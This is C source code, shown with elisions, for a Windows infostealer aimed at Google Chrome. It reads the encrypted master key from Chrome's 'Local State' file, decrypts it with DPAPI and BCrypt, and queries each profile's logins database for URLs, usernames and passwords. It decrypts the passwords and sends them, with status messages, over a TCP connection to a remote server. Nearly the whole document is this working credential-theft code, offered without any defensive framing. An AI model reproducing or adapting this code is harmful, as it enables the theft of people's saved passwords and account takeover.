...
int main() {
	...
	if (!cipher_text_byte) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "malloc: Error when allocating buffer for 'cipher_text_byte'\n");
	...
	if (!decrypted_credential) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "malloc: Error when allocating buffer for 'decrypted_credential'\n");
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if (!get_chrome_directory(chrome_dir, MAX_PATH)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Getting chrome path error\n");
		sendData(tcp_send_buffer);
		exit(1);
	}
	...
	if (!get_enc_masterkey(chrome_dir, enc_master_key)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Getting 'Encrypted Master Key' error\n");
		sendData(tcp_send_buffer);
		exit(1);
	}
	...
	if (!decrypt_masterkey(enc_master_key, &handle_bcrypt)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Decrypting 'Master Key' error\n");
		sendData(tcp_send_buffer);
		exit(1);
	}
	...
	if ((err = wcstombs_s(&size_returned_char_master_key, chrome_dir_char, MAX_PATH * sizeof(CHAR), chrome_dir, (MAX_PATH - 1) * sizeof(CHAR)))) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);
		sendData(tcp_send_buffer);
		exit(1);
	}
	...
	if (!get_file_handle(chrome_dir_char, &dir_files, &dir_handle)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Getting Chrome Directory file handle failed\n");
		sendData(tcp_send_buffer);
		exit(1);
	}
	...
	do {
		if (is_substring_in("Default", dir_files.cFileName) || is_substring_in("Profile", dir_files.cFileName)) {	// Check if a folder starts with "Deafult" or "Profile \d?" to identify profile directories
			...
			sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "------------------------ %s ------------------------\n", dir_files.cFileName);
			sendData(tcp_send_buffer);

			/* Open database connection */
			if (!open_database_conn(chrome_dir_char, dir_files.cFileName, &handle_db)) {
				sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Error when opening database\n");
				sendData(tcp_send_buffer);
				continue;
			}
			...
			if ((status = sqlite3_prepare_v2(handle_db, "SELECT origin_url,username_value,password_value FROM logins", -1, &sql_stmt, 0)) != SQLITE_OK) {
				sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "sqlite3_prepare_v2: Error when preaparing statement, error: %s:%d\n", sqlite3_errmsg(handle_db), status);
				sendData(tcp_send_buffer);
				continue;
			}
			...
			while ((status = sqlite3_step(sql_stmt)) == SQLITE_ROW) {
				sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "URL: %s\n", sqlite3_column_text(sql_stmt, 0));
				sendData(tcp_send_buffer);
				sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Username: %s\n", sqlite3_column_text(sql_stmt, 1));
				sendData(tcp_send_buffer);
				...
				if (!get_credentials(handle_bcrypt, &data_blob, &data_blob_size, &cipher_text_byte, &default_cipher_text_size, iv, tag, &tmp_cipher_text_byte, &decrypted_credential, &decrypted_credential_size)) {
					sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Getting decrypted password error\n");
					sendData(tcp_send_buffer);
					continue;
				}

				/* Get the password */
				sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Password: %s\n", decrypted_credential);
				sendData(tcp_send_buffer);
				memset(decrypted_credential, 0, decrypted_credential_size);

				sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "------------------------------------------\n");
				sendData(tcp_send_buffer);
			}

			/* If any error occurs */
			if (status != SQLITE_ROW) {
				sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "!!! %s:%d\n", sqlite3_errmsg(handle_db), status);
				sendData(tcp_send_buffer);
			}

			/* Reset SQL statement */
			if ((status = sqlite3_reset(sql_stmt)) != 0) {
				sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "sqlite3_reset: %s:%d\n", sqlite3_errmsg(handle_db), status);
				sendData(tcp_send_buffer);
			}
...
BOOL get_chrome_directory(PWSTR buffer, SIZE_T buffer_size) {
	...
	if (FAILED(hr = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &p_temp_chrome_dir))) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "SHGetKnownFolderPath: Getting Local Appdata Directory error code: %d\n", hr);
		sendData(tcp_send_buffer);
	...
	if ((err = wmemcpy_s(buffer, buffer_size, p_temp_chrome_dir, lstrlenW(p_temp_chrome_dir))) != 0) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "wmemcpy_s: Copying %%LOCALAPPDATA%% to buffer error code: %d\n", err);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if ((err = wmemcpy_s(buffer + lstrlenW(p_temp_chrome_dir), buffer_size, L"\\Google\\Chrome\\User Data", 25)) != 0) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "wmemcpy_s: Copying Chrome Userdata folder to buffer error code: %d\n", err);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if (!PathFileExistsW(buffer)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "PathFileExistsW: No folder found.\n");
		sendData(tcp_send_buffer);
		return FALSE;
	}
...
BOOL get_enc_masterkey(PCWSTR chrome_dir, PWCHAR enc_master_key) {
	...
	if ((err = wmemcpy_s(local_state_location, MAX_PATH, chrome_dir, lstrlenW(chrome_dir))) != 0) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "wmemcpy_s: Copying Chrome path to buffer error code: %d\n", err);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if ((err = wmemcpy_s(local_state_location + lstrlenW(chrome_dir), MAX_PATH, L"\\Local State", 13)) != 0) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "wmemcpy_s: Copying 'Local State' file path to buffer error code: %d\n", err);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if (!PathFileExistsW(local_state_location)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "PathFileExistsW: No 'Local State' file found.\n");
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if ((err = _wfopen_s(&fp_local_state_file, local_state_location, L"r, ccs=UTF-8")) != 0) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "_wfopen_s: Opening Local State file error code: %d:%d\n", err, errno);
		sendData(tcp_send_buffer);
	}
			...
			if (!quoteFound) {
				...
				if (propertyFound) {
					...
					if ((err = fclose(fp_local_state_file)) != 0) {
						sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "fclose: Local File closing error code: %d\n", err);
						sendData(tcp_send_buffer);
					}
					return TRUE;
				}
...
BOOL decrypt_masterkey(PWCHAR enc_master_key, BCRYPT_KEY_HANDLE* p_handle_key) {
	...
	*/
	...
	if (!(CryptStringToBinaryA(char_master_key, 0, CRYPT_STRING_BASE64, NULL, &size_byte_master_key, NULL, NULL))) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "CryptStringToBinaryA: Error when getting size of the buffer to hold byte master key, error: %d\n", err);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if (!byte_master_key) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "malloc: Error when allocating memory for byte master key\n");
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if (!(CryptStringToBinaryA(char_master_key, 0, CRYPT_STRING_BASE64, byte_master_key, &size_byte_master_key, NULL, NULL))) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "CryptStringToBinaryA: Error when converting and placing byte master key, error: %d\n", err);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if (!(CryptUnprotectData(&blob_enc_masterkey, NULL, NULL, NULL, NULL, 0, &blob_dec_masterkey))) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "CryptUnprotectData: Master key decryption failed.\n");
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	*/
	...
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "BCryptOpenAlgorithmProvider: Error getting BCrypt handle, error: %ld\n", bcryptStatus);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "BCryptSetProperty: Error setting BCrypt handle, error: %ld\n", bcryptStatus);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "BCryptGetProperty: Error getting BCrypt handle, BCRYPT_AUTH_TAG_LENGTH, error: %ld\n", bcryptStatus);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	DWORD blockLength = 0;
	...
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "BCryptGetProperty: Error getting BCrypt handle, BCRYPT_BLOCK_LENGTH, error: %ld\n", bcryptStatus);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "BCryptGenerateSymmetricKey: Error generating Symetric key, error: %ld\n", bcryptStatus);
		sendData(tcp_send_buffer);
		return FALSE;
	}
...
BOOL get_file_handle(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle) {
	...
	if ((err = strcat_s(chrome_dir, MAX_PATH, "\\*")) != 0) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "strcat_s: Appending '\\\\*' to chrome_dir error: %d\n", err);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	*dir_handle = FindFirstFileA(chrome_dir, dir_files);
	if (dir_handle == INVALID_HANDLE_VALUE) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Getting sub directories error: %d\n", GetLastError());
		sendData(tcp_send_buffer);
		return FALSE;
	}
...
BOOL decrypt_password(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE* cipher_text, ULONG size_cipher_text, BYTE* iv, ULONG size_iv, BYTE* tag, ULONG size_tag, BYTE** decrypted_credentials, ULONG* size_decrypted_credentials) {
	...
	if (!NT_SUCCESS(status)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "BCryptDecrypt: Error getting decrypted text size, error: %ld\n", status);
		sendData(tcp_send_buffer);
		return FALSE;
	}
	...
	if (size_required_decrypted_buffer > *size_decrypted_credentials) {
		...
		if (!tmp_byte) {
			sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "realloc: Error when reallocating size of decrypted_credentials_buffer\n");
			sendData(tcp_send_buffer);
			return FALSE;
		}
		else {
...
BOOL get_credentials(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE** enc_password, int* size_enc_password, BYTE** cipher_text, PULONG size_cipher_text, BYTE* iv, BYTE* tag, BYTE** tmp_pointer, BYTE** decrypted_byte, PULONG decrypted_byte_size) {
		...
		*tmp_pointer = (BYTE*)realloc(*cipher_text, *size_enc_password);
		if (*tmp_pointer) {
			...
			*size_cipher_text = *size_enc_password;
			...
			sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Couldn't reallocate memory for cipher_text_byte\n");
			sendData(tcp_send_buffer);
			return FALSE;
		}
	}
	...
	if (!decrypt_password(handle_bcrypt, *cipher_text, *size_enc_password - (3 + 12 + 16), iv, IV_LEN, tag, TAG_LEN, decrypted_byte, decrypted_byte_size)) {
		sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Decrypting password error\n");
		sendData(tcp_send_buffer);
		return FALSE;
	}
...
void connect_to_serv(SOCKET* ConnectSocket) {
	...
	if (iResult != 0) {
		// sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "WSAStartup failed with error: %d\n", iResult);
		exit(1);
	}
	...
	if (iResult != 0) {
		// sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		exit(1);
	}
	...
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		...
		*ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
		...
		if (*ConnectSocket == INVALID_SOCKET) {
			// sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			exit(1);
		}
	...
	if (*ConnectSocket == INVALID_SOCKET) {
		// sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "Unable to connect to server!\n");
		WSACleanup();
		exit(1);
	}
...
void sendData(char* data) {
	...
	if (iResult == SOCKET_ERROR) {
		// sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "send failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
	}
...
void closeConnection() {
	...
	if (iResult == SOCKET_ERROR) {
		// sprintf(tcp_send_buffer, DEFAULT_BUFLEN, "shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
	}
